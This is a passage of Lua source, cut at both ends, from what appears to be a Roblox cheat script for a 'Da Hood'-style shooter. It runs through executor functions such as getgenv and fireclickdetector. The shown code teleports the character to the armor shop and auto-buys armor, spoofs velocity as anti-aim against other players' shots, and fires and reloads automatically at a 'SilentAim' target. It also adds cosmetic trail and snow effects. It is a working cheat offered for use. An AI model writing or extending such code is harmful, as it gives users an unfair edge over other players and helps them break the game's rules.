		if not G.AutoArmorSettings.Enabled then
			return;
		end
		G.now = tick();
		if G.AutoArmorSettings.IsBuying then
			if (G.now >= G.AutoArmorSettings.BuyingTimeout) then
				G.AutoArmorSettings.IsBuying = false;
				if getgenv().SaveDistance then
					getgenv().SaveDistance.IsBuyingArmor = false;
				end
				if (G.AutoArmorSettings.originalTSState and getgenv().TS) then
					getgenv().TS.Config.Enabled = G.AutoArmorSettings.originalTSState.Enabled;
					getgenv().TS.Config.UseDesync = G.AutoArmorSettings.originalTSState.UseDesync;
					if (G.AutoArmorSettings.originalTSState.UseDesync and G.AutoArmorSettings.DesyncPosition) then
						getgenv().TS.Runtime.DesyncPosition = G.AutoArmorSettings.DesyncPosition;
					end
				end
				if G.AutoArmorSettings.Notify then
					Library:Notify(">_<", 2);
				end
			else
				return;
			end
		end
		if ((G.now - G.AutoArmorSettings.LastArmorCheck) < G.AutoArmorSettings.CheckInterval) then
			return;
		end
		G.AutoArmorSettings.LastArmorCheck = G.now;
		G.AutoArmorSettings.char = LP.Character;
		if not G.AutoArmorSettings.char then
			return;
		end
		local bodyEffects = G.AutoArmorSettings.char:FindFirstChild("BodyEffects");
		if bodyEffects then
			local ko = bodyEffects:FindFirstChild("K.O");
			if (ko and ko.Value) then
				return;
			end
			local grabbed = bodyEffects:FindFirstChild("Grabbed");
			if (grabbed and grabbed.Value) then
				return;
			end
		end
		G.AutoArmorSettings.armorValue = G.getCurrentArmorValue();
		if G.AutoArmorSettings.DebugMode then
			print("Current armor value:", G.AutoArmorSettings.armorValue);
		end
		if (G.AutoArmorSettings.armorValue < G.AutoArmorSettings.MinArmorValue) then
			G.AutoArmorSettings.IsBuying = true;
			G.AutoArmorSettings.BuyingTimeout = G.now + 15;
			task.spawn(function()
				local isAutoStompActive = getgenv().AutoStomp and getgenv().AutoStomp.isActive;
				G.AutoArmorSettings.autoStompOriginalState = nil;
				if isAutoStompActive then
					G.AutoArmorSettings.autoStompOriginalState = {Enabled=getgenv().AutoStomp.Enabled,isActive=getgenv().AutoStomp.isActive};
				end
				G.AutoArmorSettings.hrp = G.AutoArmorSettings.char:FindFirstChild("HumanoidRootPart");
				if not G.AutoArmorSettings.hrp then
					G.AutoArmorSettings.IsBuying = false;
					return;
				end
				local isTargetStrafeActive = getgenv().TS and getgenv().TS.Config and getgenv().TS.Config.Enabled;
				local isTargetStrafeDesync = isTargetStrafeActive and getgenv().TS.Config.UseDesync;
				if (isTargetStrafeDesync and getgenv().TS.Runtime.DesyncPosition) then
					G.AutoArmorSettings.BuyingArmor = G.AutoArmorSettings.hrp.CFrame;
					G.AutoArmorSettings.DesyncPosition = getgenv().TS.Runtime.DesyncPosition;
				else
					G.AutoArmorSettings.BuyingArmor = G.AutoArmorSettings.hrp.CFrame;
					G.AutoArmorSettings.DesyncPosition = nil;
				end
				G.AutoArmorSettings.originalVelocity = G.AutoArmorSettings.hrp.Velocity;
				if (getgenv().SaveDistance and getgenv().SaveDistance.Enabled) then
					getgenv().SaveDistance.IsBuyingArmor = true;
				end
				G.AutoArmorSettings.originalTSState = nil;
				if (getgenv().TS and getgenv().TS.Config) then
					G.AutoArmorSettings.originalTSState = {Enabled=getgenv().TS.Config.Enabled,UseDesync=getgenv().TS.Config.UseDesync};
					getgenv().TS.Config.Enabled = false;
				end
				local isDelHoodArmor = false;
				local selectedArmorIndex = nil;
				if (type(G.AutoArmorSettings.ArmorType) == "number") then
					isDelHoodArmor = true;
					selectedArmorIndex = G.AutoArmorSettings.ArmorType;
				elseif G.AutoArmorSettings.ArmorType:lower():find("max") then
					isDelHoodArmor = true;
				end
				if isDelHoodArmor then
					G.AutoArmorSettings.armorItem = G.getSafeArmorShop();
					if G.AutoArmorSettings.armorItem then
						G.AutoArmorSettings.armorShop = G.AutoArmorSettings.armorItem.Parent;
					else
						G.AutoArmorSettings.armorShop = workspace:FindFirstChild("Ignored") and workspace.Ignored:FindFirstChild("Shop");
						if G.AutoArmorSettings.armorShop then
							if selectedArmorIndex then
								G.AutoArmorSettings.armorItem = G.AutoArmorSettings.armorShop:GetChildren()[selectedArmorIndex];
							else
								G.AutoArmorSettings.armorItem = G.AutoArmorSettings.armorShop:FindFirstChild(G.AutoArmorSettings.ArmorType);
								if not G.AutoArmorSettings.armorItem then
									for _, item in pairs(G.AutoArmorSettings.armorShop:GetChildren()) do
										if (item.Name:lower():find("armor") and item.Name:lower():find("max")) then
											G.AutoArmorSettings.armorItem = item;
											break;
										end
									end
								end
							end
						end
					end
				else
					G.AutoArmorSettings.armorShop = workspace:FindFirstChild("Ignored") and workspace.Ignored:FindFirstChild("Shop");
					if G.AutoArmorSettings.armorShop then
						G.AutoArmorSettings.armorItem = G.AutoArmorSettings.armorShop:FindFirstChild(G.AutoArmorSettings.ArmorType);
					end
					if (not G.AutoArmorSettings.armorShop or not G.AutoArmorSettings.armorItem) then
						for _, folder in pairs(workspace:GetChildren()) do
							if folder:FindFirstChild("Shop") then
								G.AutoArmorSettings.armorShop = folder.Shop;
								G.AutoArmorSettings.armorItem = G.AutoArmorSettings.armorShop:FindFirstChild(G.AutoArmorSettings.ArmorType);
								if G.AutoArmorSettings.armorItem then
									break;
								end
							end
						end
					end
					if (G.AutoArmorSettings.armorShop and not G.AutoArmorSettings.armorItem) then
						for _, item in pairs(G.AutoArmorSettings.armorShop:GetChildren()) do
							if item.Name:lower():find("armor") then
								G.AutoArmorSettings.armorItem = item;
								break;
							end
						end
					end
				end
				if (not G.AutoArmorSettings.armorItem or not G.AutoArmorSettings.armorItem:FindFirstChild("Head") or not G.AutoArmorSettings.armorItem:FindFirstChild("ClickDetector")) then
					if getgenv().SaveDistance then
						getgenv().SaveDistance.IsBuyingArmor = false;
					end
					G.AutoArmorSettings.IsBuying = false;
					if (G.AutoArmorSettings.originalTSState and getgenv().TS) then
						getgenv().TS.Config.Enabled = G.AutoArmorSettings.originalTSState.Enabled;
						getgenv().TS.Config.UseDesync = G.AutoArmorSettings.originalTSState.UseDesync;
					end
					if G.AutoArmorSettings.autoStompOriginalState then
						getgenv().AutoStomp.Enabled = G.AutoArmorSettings.autoStompOriginalState.Enabled;
						getgenv().AutoStomp.isActive = G.AutoArmorSettings.autoStompOriginalState.isActive;
					end
					return;
				end
				if not (G.AutoArmorSettings.armorItem:FindFirstChild("Head") and G.AutoArmorSettings.armorItem:FindFirstChild("ClickDetector")) then
					if getgenv().SaveDistance then
						getgenv().SaveDistance.IsBuyingArmor = false;
					end
					G.AutoArmorSettings.IsBuying = false;
					if G.AutoArmorSettings.autoStompOriginalState then
						getgenv().AutoStomp.Enabled = G.AutoArmorSettings.autoStompOriginalState.Enabled;
						getgenv().AutoStomp.isActive = G.AutoArmorSettings.autoStompOriginalState.isActive;
					end
					return;
				end
				G.AutoArmorSettings.originalCFrame = G.AutoArmorSettings.hrp.CFrame;
				G.AutoArmorSettings.originalVelocity = G.AutoArmorSettings.hrp.Velocity;
				local armorPosition = G.AutoArmorSettings.armorItem.Head.CFrame;
				G.AutoArmorSettings.originalCFrame = G.AutoArmorSettings.hrp.CFrame;
				G.AutoArmorSettings.originalVelocity = G.AutoArmorSettings.hrp.Velocity;
				G.AutoArmorSettings.hrp.CFrame = armorPosition;
				G.AutoArmorSettings.hrp.Velocity = Vector3.new(0, 0, 0);
				local fixPositionConnection = nil;
				fixPositionConnection = game:GetService("RunService").Heartbeat:Connect(function()
					if (G.AutoArmorSettings.hrp and G.AutoArmorSettings.hrp.Parent) then
						G.AutoArmorSettings.hrp.CFrame = armorPosition;
						G.AutoArmorSettings.hrp.Velocity = Vector3.new(0, 0, 0);
					elseif fixPositionConnection then
						fixPositionConnection:Disconnect();
						fixPositionConnection = nil;
					end
				end);
				while G.getCurrentArmorValue() < G.AutoArmorSettings.MinArmorValue do
					if (tick() >= G.AutoArmorSettings.BuyingTimeout) then
						break;
					end
					local bodyEffects = G.AutoArmorSettings.char:FindFirstChild("BodyEffects");
					if bodyEffects then
						local ko = bodyEffects:FindFirstChild("K.O");
						local grabbed = bodyEffects:FindFirstChild("Grabbed");
						if ((ko and ko.Value) or (grabbed and grabbed.Value)) then
							break;
						end
					end
					fireclickdetector(G.AutoArmorSettings.armorItem.ClickDetector);
					task.wait(0.2);
				end
				if fixPositionConnection then
					fixPositionConnection:Disconnect();
					fixPositionConnection = nil;
				end
				if (G.getCurrentArmorValue() >= G.AutoArmorSettings.MinArmorValue) then
					G.AutoArmorSettings.hrp.CFrame = G.AutoArmorSettings.originalCFrame;
					G.AutoArmorSettings.hrp.Velocity = G.AutoArmorSettings.originalVelocity;
				elseif (tick() < G.AutoArmorSettings.BuyingTimeout) then
					return;
				end
				if (G.AutoArmorSettings.originalTSState and getgenv().TS) then
					getgenv().TS.Config.Enabled = G.AutoArmorSettings.originalTSState.Enabled;
					getgenv().TS.Config.UseDesync = G.AutoArmorSettings.originalTSState.UseDesync;
					if (G.AutoArmorSettings.originalTSState.UseDesync and G.AutoArmorSettings.DesyncPosition) then
						task.wait(0.2);
						getgenv().TS.Runtime.DesyncPosition = G.AutoArmorSettings.DesyncPosition;
					end
				end
				if (G.AutoArmorSettings.hrp and G.AutoArmorSettings.hrp.Parent) then
					for i = 1, 3 do
						G.AutoArmorSettings.hrp.CFrame = G.AutoArmorSettings.BuyingArmor;
						G.AutoArmorSettings.hrp.Velocity = G.AutoArmorSettings.originalVelocity;
						task.wait(0.1);
					end
				end
				task.wait(0.2);
				if G.AutoArmorSettings.autoStompOriginalState then
					getgenv().AutoStomp.Enabled = G.AutoArmorSettings.autoStompOriginalState.Enabled;
					getgenv().AutoStomp.isActive = G.AutoArmorSettings.autoStompOriginalState.isActive;
				end
				if getgenv().SaveDistance then
					getgenv().SaveDistance.IsBuyingArmor = false;
				end
				G.AutoArmorSettings.IsBuying = false;
				if G.AutoArmorSettings.Notify then
					Library:Notify(">_<", 2);
				end
			end);
		else
			G.AutoArmorSettings.BuyingArmor = nil;
		end
	end);
	if (not G.success and G.AutoArmorSettings.Notify) then
		Library:Notify(">_<", 3);
		G.AutoArmorSettings.IsBuying = false;
		if getgenv().SaveDistance then
			getgenv().SaveDistance.IsBuyingArmor = false;
		end
		if (G.AutoArmorSettings.originalTSState and getgenv().TS) then
			getgenv().TS.Config.Enabled = G.AutoArmorSettings.originalTSState.Enabled;
			getgenv().TS.Config.UseDesync = G.AutoArmorSettings.originalTSState.UseDesync;
		end
		if (getgenv().AutoStomp and G.AutoArmorSettings.autoStompOriginalState) then
			getgenv().AutoStomp.Enabled = G.AutoArmorSettings.autoStompOriginalState.Enabled;
			getgenv().AutoStomp.isActive = G.AutoArmorSettings.autoStompOriginalState.isActive;
		end
	end
end;
G.toggleAutoArmor = function(state)
	G.AutoArmorSettings.Enabled = state;
	if G.AutoArmorSettings.Connection then
		G.AutoArmorSettings.Connection:Disconnect();
		G.AutoArmorSettings.Connection = nil;
	end
	if state then
		G.AutoArmorSettings.Connection = game:GetService("RunService").RenderStepped:Connect(G.autoArmorFunction);
		task.spawn(function()
			G.autoArmorFunction();
		end);
		Library:Notify(">_< on", 3);
	else
		Library:Notify(">_< off", 3);
	end
end;
addToggleWithNotify(G.AutoArmorGroup, "AutoArmorEnabled", {Text="AutoArmor",Default=false,Callback=function(v)
	G.toggleAutoArmor(v);
end,Tooltip=">_<"});
G.AutoArmorGroup:AddSlider("AutoArmorMinValue", {Text="MinValue",Default=G.AutoArmorSettings.MinArmorValue,Min=0,Max=200,Rounding=0,Callback=function(v)
	G.AutoArmorSettings.MinArmorValue = v;
end,Tooltip=">_<"});
G.AutoArmorGroup:AddSlider("AutoArmorInterval", {Text="Interval",Default=G.AutoArmorSettings.CheckInterval,Min=0.1,Max=5,Rounding=1,Callback=function(v)
	G.AutoArmorSettings.CheckInterval = v;
end,Tooltip=">_<"});
G.delHoodArmorOptions = {[1]={index=59,name="Max Armor 1"},[2]={index=46,name="Max Armor 2"},[3]={index=63,name="Max Armor 3"},[4]={index=68,name="Max Armor 4"},[5]={name="[Max Armor]",direct=true}};
G.isAreaSafe = function(position, radius)
	if not position then
		return false;
	end
	for _, player in pairs(S.PS:GetPlayers()) do
		if ((player ~= LP) and player.Character and player.Character:FindFirstChild("HumanoidRootPart")) then
			local distance = (player.Character.HumanoidRootPart.Position - position).Magnitude;
			if (distance <= radius) then
				return false;
			end
		end
	end
	return true;
end;
G.getSafeArmorShop = function()
	if (not workspace:FindFirstChild("Ignored") or not workspace.Ignored:FindFirstChild("Shop")) then
		return nil;
	end
	local shop = workspace.Ignored.Shop;
	local safeOptions = {};
	for i, option in pairs(G.delHoodArmorOptions) do
		local armorObj;
		if option.direct then
			armorObj = shop:FindFirstChild(option.name);
		else
			armorObj = shop:GetChildren()[option.index];
		end
		if (armorObj and armorObj:FindFirstChild("Head")) then
			local position = armorObj.Head.Position;
			local isSafe = G.isAreaSafe(position, 15);
			table.insert(safeOptions, {object=armorObj,isSafe=isSafe,name=option.name});
		end
	end
	for _, option in ipairs(safeOptions) do
		if option.isSafe then
			return option.object;
		end
	end
	for _, option in ipairs(safeOptions) do
		return option.object;
	end
	for _, item in pairs(shop:GetChildren()) do
		if (item.Name:lower():find("armor") and item.Name:lower():find("max")) then
			return item;
		end
	end
	return nil;
end;
G.setupArmorOptions = function()
	G.armorDropdownValues = {"Max Armor 1 (Del Hood)","Max Armor 2 (Del Hood)","Max Armor 3 (Del Hood)","Max Armor 4 (Del Hood)"};
	G.armorValueMap = {};
	G.armorValueMap["Max Armor 1 (Del Hood)"] = 1;
	G.armorValueMap["Max Armor 2 (Del Hood)"] = 2;
	G.armorValueMap["Max Armor 3 (Del Hood)"] = 3;
	G.armorValueMap["Max Armor 4 (Del Hood)"] = 4;
end;
G.setupArmorOptions();
G.AutoArmorSettings.ArmorValuesMap = G.armorValueMap;
G.AutoArmorGroup:AddDropdown("AutoArmorType", {Text="ArmorType",Values={"Max Armor 1 (Del Hood)","Max Armor 2 (Del Hood)","Max Armor 3 (Del Hood)","Max Armor 4 (Del Hood)"},Default="Max Armor 1 (Del Hood)",Callback=function(v)
	local armorNumber = tonumber(string.match(v, "Max Armor (%d)"));
	G.AutoArmorSettings.ArmorType = armorNumber or 1;
	if G.AutoArmorSettings.DebugMode then
		print("Selected armor type:", G.AutoArmorSettings.ArmorType, "Type:", type(G.AutoArmorSettings.ArmorType));
	end
end,Tooltip=">_<"});
local VelocityAAGroup = Tabs.Player:AddRightGroupbox(">_<");
getgenv().VelocityAA = {Enable=false,Visualise=false};
getgenv().velocityAAConnection = nil;
local velocityAAConnection = getgenv().velocityAAConnection;
getgenv().velocityVisualizer = {anchorPart=nil,billboard=nil,imageLabel=nil,connection=nil,characterConnection=nil};
local velocityVisualizer = getgenv().velocityVisualizer;
getgenv().createVelocityVisualizer = function()
	if velocityVisualizer.anchorPart then
		velocityVisualizer.anchorPart:Destroy();
	end
	local createVelocityVisualizer = getgenv().createVelocityVisualizer;
	if velocityVisualizer.connection then
		velocityVisualizer.connection:Disconnect();
		velocityVisualizer.connection = nil;
	end
	if velocityVisualizer.characterConnection then
		velocityVisualizer.characterConnection:Disconnect();
		velocityVisualizer.characterConnection = nil;
	end
	local anchorPart = Instance.new("Part");
	anchorPart.Name = "VelocityAnchor";
	anchorPart.Anchored = true;
	anchorPart.CanCollide = false;
	anchorPart.Transparency = 1;
	anchorPart.Size = Vector3.new(0.1, 0.1, 0.1);
	anchorPart.Parent = workspace;
	local billboard = Instance.new("BillboardGui");
	billboard.Adornee = anchorPart;
	billboard.Size = UDim2.new(1.5, 0, 1.5, 0);
	billboard.AlwaysOnTop = true;
	billboard.LightInfluence = 0;
	billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	billboard.MaxDistance = 10000;
	billboard.Parent = anchorPart;
	local imageLabel = Instance.new("ImageLabel");
	imageLabel.Image = "rbxassetid://108758683130028";
	imageLabel.Size = UDim2.new(1, 0, 1, 0);
	imageLabel.BackgroundTransparency = 1;
	imageLabel.ZIndex = 999999;
	imageLabel.Parent = billboard;
	velocityVisualizer.anchorPart = anchorPart;
	velocityVisualizer.billboard = billboard;
	velocityVisualizer.imageLabel = imageLabel;
	local velocityMultiplier = 0.3;
	local maxDistance = 15;
	local lowerTorso = nil;
	local function updateVisualizer()
		if not getgenv().VelocityAA.Visualise then
			return;
		end
		if (not lowerTorso or not lowerTorso:IsDescendantOf(workspace)) then
			if LP.Character then
				lowerTorso = LP.Character:FindFirstChild("LowerTorso");
				if not lowerTorso then
					lowerTorso = LP.Character:FindFirstChild("HumanoidRootPart");
				end
			end
			if not lowerTorso then
				return;
			end
		end
		if getgenv().VelocityAA.Enable then
			imageLabel.Visible = true;
			anchorPart.CFrame = CFrame.new(lowerTorso.Position + Vector3.new(0, 250, 0));
			imageLabel.ImageColor3 = Color3.fromRGB(255, 0, 0);
		else
			local vel = lowerTorso.Velocity;
			local speed = vel.Magnitude;
			if (speed < 1) then
				imageLabel.Visible = false;
				return;
			else
				imageLabel.Visible = true;
			end
			local direction = vel.Unit;
			local distance = math.min(speed * velocityMultiplier, maxDistance);
			anchorPart.CFrame = CFrame.new(lowerTorso.Position + (direction * distance) + Vector3.new(0, 0.5, 0));
			imageLabel.Rotation = math.deg(math.atan2(direction.X, direction.Z)) + 180;
		end
	end
	velocityVisualizer.connection = game:GetService("RunService").Heartbeat:Connect(updateVisualizer);
	velocityVisualizer.characterConnection = LP.CharacterAdded:Connect(function(newChar)
		task.wait(0.5);
		lowerTorso = newChar:FindFirstChild("LowerTorso") or newChar:WaitForChild("LowerTorso", 3);
		if not lowerTorso then
			lowerTorso = newChar:FindFirstChild("HumanoidRootPart") or newChar:WaitForChild("HumanoidRootPart", 3);
		end
	end);
	if LP.Character then
		lowerTorso = LP.Character:FindFirstChild("LowerTorso");
		if not lowerTorso then
			lowerTorso = LP.Character:FindFirstChild("HumanoidRootPart");
		end
	end
end;
getgenv().toggleVelocityVisualizer = function(state)
	getgenv().VelocityAA.Visualise = state;
	if state then
		createVelocityVisualizer();
		Library:Notify(">_<", 3);
	else
		if velocityVisualizer.connection then
			velocityVisualizer.connection:Disconnect();
			velocityVisualizer.connection = nil;
		end
		if velocityVisualizer.characterConnection then
			velocityVisualizer.characterConnection:Disconnect();
			velocityVisualizer.characterConnection = nil;
		end
		if velocityVisualizer.anchorPart then
			velocityVisualizer.anchorPart:Destroy();
			velocityVisualizer.anchorPart = nil;
		end
	end
end;
local toggleVelocityVisualizer = getgenv().toggleVelocityVisualizer;
getgenv().toggleVelocityAA = function(state)
	getgenv().VelocityAA.Enable = state;
	if state then
		if velocityAAConnection then
			velocityAAConnection:Disconnect();
		end
		velocityAAConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if getgenv().VelocityAA.Enable then
				local character = LP.Character;
				if (character and character:FindFirstChild("HumanoidRootPart")) then
					local hrp = character.HumanoidRootPart;
					local vel = hrp.Velocity;
					hrp.Velocity = Vector3.new(0, 250, 0);
					game:GetService("RunService").RenderStepped:Wait();
					hrp.Velocity = vel;
				end
			end
		end);
		if (getgenv().VelocityAA.Visualise and not velocityVisualizer.anchorPart) then
			createVelocityVisualizer();
		end
	elseif velocityAAConnection then
		velocityAAConnection:Disconnect();
		velocityAAConnection = nil;
	end
end;
getgenv().VelocityAAToggle = addToggleWithNotify(VelocityAAGroup, "VelocityAAEnabled", {Text="VelocityAA",Default=false,Callback=function(v)
	getgenv().toggleVelocityAA(v);
end,Tooltip=">_<"});
addToggleWithNotify(VelocityAAGroup, "VisualiseVeloEnabled", {Text="VisualiseVelo",Default=false,Callback=function(v)
	toggleVelocityVisualizer(v);
end,Tooltip=">_<"}):AddColorPicker("VisualiseVeloColor", {Default=Color3.fromRGB(255, 255, 255),Title="Color",Transparency=0,Callback=function(val)
	if (velocityVisualizer and velocityVisualizer.imageLabel) then
		velocityVisualizer.imageLabel.ImageColor3 = val;
	end
end});
LP.CharacterRemoving:Connect(function()
	if getgenv().VelocityAA.Enable then
		getgenv().toggleVelocityAA(false);
		Toggles.VelocityAAEnabled:SetValue(false);
	end
	if getgenv().VelocityAA.Visualise then
		toggleVelocityVisualizer(false);
		Toggles.VisualiseVeloEnabled:SetValue(false);
	end
	if _G.AutoShootConnection then
		_G.AutoShootConnection:Disconnect();
		_G.AutoShootConnection = nil;
	end
	if _G.AutoReloadConnection then
		_G.AutoReloadConnection:Disconnect();
		_G.AutoReloadConnection = nil;
	end
end);
LP.CharacterAdded:Connect(function(character)
	if (_G.AutoReload and Toggles.AutoReload and Toggles.AutoReload.Value) then
		if _G.AutoReloadConnection then
			_G.AutoReloadConnection:Disconnect();
			_G.AutoReloadConnection = nil;
		end
		_G.AutoReloadConnection = game:GetService("RunService").Heartbeat:Connect(function()
			pcall(function()
				local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
				if not target then
					return;
				end
				local tool = character:FindFirstChildWhichIsA("Tool");
				if tool then
					local ammo = tool:FindFirstChild("Ammo");
					if (ammo and (ammo.Value <= 0)) then
						local mainEvent = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent");
						if mainEvent then
							mainEvent:FireServer("Reload", tool);
							task.wait(1);
						else
							pcall(function()
								for _, service in pairs({game:GetService("ReplicatedStorage"),game:GetService("Players").LocalPlayer,workspace}) do
									local event = service:FindFirstChild("MainEvent", true);
									if event then
										event:FireServer("Reload", tool);
										task.wait(1);
										return;
									end
								end
								tool:Activate();
							end);
						end
					end
				end
			end);
		end);
	end
	if (_G.AutoShoot and Toggles.AutoShoot and Toggles.AutoShoot.Value) then
		if _G.AutoShootConnection then
			_G.AutoShootConnection:Disconnect();
			_G.AutoShootConnection = nil;
		end
		_G.AutoShootConnection = game:GetService("RunService").Heartbeat:Connect(function()
			pcall(function()
				local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
				if not target then
					return;
				end
				local tool = character:FindFirstChildWhichIsA("Tool");
				if not tool then
					return;
				end
				local ammo = tool:FindFirstChild("Ammo");
				if (ammo and (ammo.Value <= 0)) then
					local toolName = tool.Name;
					tool.Parent = game:GetService("Players").LocalPlayer.Backpack;
					task.wait(0.03);
					if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolName) then
						game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolName).Parent = character;
					end
					task.wait(0.03);
				else
					tool:Activate();
					task.wait(0.03);
				end
			end);
		end);
	end
end);
getgenv().TrailSettings = {enabled=false,color1=Color3.new(1, 1, 1),color2=Color3.new(1, 1, 1),transparency=0.2,lifetime=2};
getgenv().removeTrail = function()
	if (getgenv().currentTrail and getgenv().currentTrail.Parent) then
		for _, child in pairs(LP.Character:GetChildren()) do
			if (child:IsA("Trail") or (child:IsA("Attachment") and ((child.Name == "TrailAttachment0") or (child.Name == "TrailAttachment1")))) then
				child:Destroy();
			end
		end
	end
	getgenv().currentTrail = nil;
end;
getgenv().createTrail = function(character)
	getgenv().removeTrail();
	getgenv().trailHead = character:FindFirstChild("Head");
	getgenv().trailHrp = character:FindFirstChild("HumanoidRootPart");
	if (getgenv().trailHead and getgenv().trailHrp) then
		getgenv().trailAttachment0 = Instance.new("Attachment", getgenv().trailHead);
		getgenv().trailAttachment0.Name = "TrailAttachment0";
		getgenv().trailAttachment1 = Instance.new("Attachment", getgenv().trailHrp);
		getgenv().trailAttachment1.Name = "TrailAttachment1";
		getgenv().trail = Instance.new("Trail");
		getgenv().trail.Attachment0 = getgenv().trailAttachment0;
		getgenv().trail.Attachment1 = getgenv().trailAttachment1;
		getgenv().trail.Lifetime = getgenv().TrailSettings.lifetime;
		getgenv().trail.Texture = "rbxassetid://18421838422";
		getgenv().trail.TextureMode = Enum.TextureMode.Stretch;
		getgenv().trail.Transparency = NumberSequence.new(getgenv().TrailSettings.transparency, 1);
		getgenv().trail.MinLength = 0.5;
		getgenv().trail.WidthScale = NumberSequence.new(0.7);
		getgenv().trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, getgenv().TrailSettings.color1),ColorSequenceKeypoint.new(1, getgenv().TrailSettings.color2)});
		getgenv().trail.Parent = character;
		getgenv().currentTrail = getgenv().trail;
	end
end;
getgenv().updateTrail = function(prop)
	if not (getgenv().currentTrail and getgenv().currentTrail.Parent) then
		return;
	end
	if ((prop == "color") or (prop == nil)) then
		getgenv().currentTrail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, getgenv().TrailSettings.color1),ColorSequenceKeypoint.new(1, getgenv().TrailSettings.color2)});
	end
	if ((prop == "transparency") or (prop == nil)) then
		getgenv().currentTrail.Transparency = NumberSequence.new(getgenv().TrailSettings.transparency, 1);
	end
	if ((prop == "lifetime") or (prop == nil)) then
		getgenv().currentTrail.Lifetime = getgenv().TrailSettings.lifetime;
	end
end;
getgenv().applyTrail = function()
	getgenv().trailCharacter = LP.Character;
	if not getgenv().trailCharacter then
		if getgenv().trailCharacterAddedConnection then
			getgenv().trailCharacterAddedConnection:Disconnect();
			getgenv().trailCharacterAddedConnection = nil;
		end
		getgenv().trailCharacterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if getgenv().TrailSettings.enabled then
				getgenv().createTrail(newCharacter);
			end
		end);
		return;
	end
	getgenv().createTrail(getgenv().trailCharacter);
	if not getgenv().trailCharacterAddedConnection then
		getgenv().trailCharacterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
			if getgenv().TrailSettings.enabled then
				getgenv().createTrail(newCharacter);
			end
		end);
	end
end;
getgenv().TrailGroup = Tabs.Visuals:AddRightGroupbox("Trail");
addToggleWithNotify(getgenv().TrailGroup, "Trail", {Text="Trail",Default=false,Callback=function(v)
	getgenv().TrailSettings.enabled = v;
	if v then
		getgenv().applyTrail();
	else
		getgenv().removeTrail();
	end
end,Tooltip=">_<"}):AddColorPicker("TrailColor1", {Default=getgenv().TrailSettings.color1,Title="Color 1",Callback=function(val)
	getgenv().TrailSettings.color1 = val;
	getgenv().updateTrail("color");
end}):AddColorPicker("TrailColor2", {Default=getgenv().TrailSettings.color2,Title="Color 2",Callback=function(val)
	getgenv().TrailSettings.color2 = val;
	getgenv().updateTrail("color");
end});
getgenv().TrailSub = getgenv().TrailGroup:AddDependencyBox();
getgenv().TrailSub:AddSlider("TrailTransparency", {Text="Transparency",Default=getgenv().TrailSettings.transparency,Min=0,Max=1,Rounding=2,Callback=function(val)
	getgenv().TrailSettings.transparency = val;
	getgenv().updateTrail("transparency");
end,Tooltip=">_<"});
getgenv().TrailSub:AddSlider("TrailLifetime", {Text="Lifetime",Default=getgenv().TrailSettings.lifetime,Min=0.5,Max=5,Rounding=1,Callback=function(val)
	getgenv().TrailSettings.lifetime = val;
	getgenv().updateTrail("lifetime");
end,Tooltip=">_<"});
getgenv().TrailSub:SetupDependencies({{Toggles.Trail,true}});
local SnowGroup = Tabs.Visuals:AddLeftGroupbox("Snow Effect");
getgenv().SnowSettings = {Enabled=false,Texture="rbxassetid://9563725822",Color=Color3.fromRGB(255, 255, 255),MinSize=0.4,MaxSize=0.4,Height=100,FallSpeed=15,WindStrength=3,SwirlIntensity=0,Density=200,Lifetime=15,Transparency=0.2,EmissionArea=Vector3.new(60, 0, 60),SnowEmitters={},SnowConnections={}};
getgenv().CreateRealSnow = function(player)
	getgenv().ClearAllSnow();
	local character = player.Character or player.CharacterAdded:Wait();
	local humanoid = character:WaitForChild("Humanoid");
	local upperTorso = character:WaitForChild("UpperTorso");
	for _, v in ipairs(upperTorso:GetChildren()) do
		if (v.Name == "RealSnowEmitter") then
			v:Destroy();
		end
	end
	local emitterAttachment = Instance.new("Attachment");
	emitterAttachment.Name = "RealSnowEmitter";
	emitterAttachment.Position = Vector3.new(0, getgenv().SnowSettings.Height, 0);
	emitterAttachment.Parent = upperTorso;
	local emitter = Instance.new("ParticleEmitter");
	emitter.Name = "SnowEmitter";
	emitter.Texture = getgenv().SnowSettings.Texture;
	emitter.LightEmission = 0.15;
	emitter.Color = ColorSequence.new(getgenv().SnowSettings.Color);
	emitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, getgenv().SnowSettings.Transparency),NumberSequenceKeypoint.new(1, 1)});
	emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, getgenv().SnowSettings.MinSize),NumberSequenceKeypoint.new(0.5, getgenv().SnowSettings.MaxSize * 0.8),NumberSequenceKeypoint.new(1, getgenv().SnowSettings.MaxSize)});
	emitter.Lifetime = NumberRange.new(getgenv().SnowSettings.Lifetime);
	emitter.Speed = NumberRange.new(getgenv().SnowSettings.FallSpeed * 0.8, getgenv().SnowSettings.FallSpeed);
	emitter.VelocitySpread = 180;
	emitter.Rotation = NumberRange.new(0, 360);
	emitter.RotSpeed = NumberRange.new(-10, 10);
	emitter.Shape = Enum.ParticleEmitterShape.Box;
	emitter.ShapeInOut = Enum.ParticleEmitterShapeInOut.Outward;
	emitter.ShapeStyle = Enum.ParticleEmitterShapeStyle.Volume;
	emitter.EmissionDirection = Enum.NormalId.Bottom;
	emitter.Rate = getgenv().SnowSettings.Density;
	local windDirection = Vector3.new((math.random() * getgenv().SnowSettings.WindStrength) - (getgenv().SnowSettings.WindStrength / 2), 0, (math.random() * getgenv().SnowSettings.WindStrength) - (getgenv().SnowSettings.WindStrength / 2));
	local swirlTime = 0;
	local windConnection;
	windConnection = S.RS.Heartbeat:Connect(function(dt)
		if (not emitter or not emitter.Parent) then
			windConnection:Disconnect();
			return;
		end
		swirlTime = swirlTime + (dt * 0.5);
		local swirlX = math.sin(swirlTime) * getgenv().SnowSettings.SwirlIntensity;
		local swirlZ = math.cos(swirlTime * 1.3) * getgenv().SnowSettings.SwirlIntensity;
		emitter.VelocityInheritance = 0.1 + (math.abs(math.sin(swirlTime * 0.7)) * 0.5);
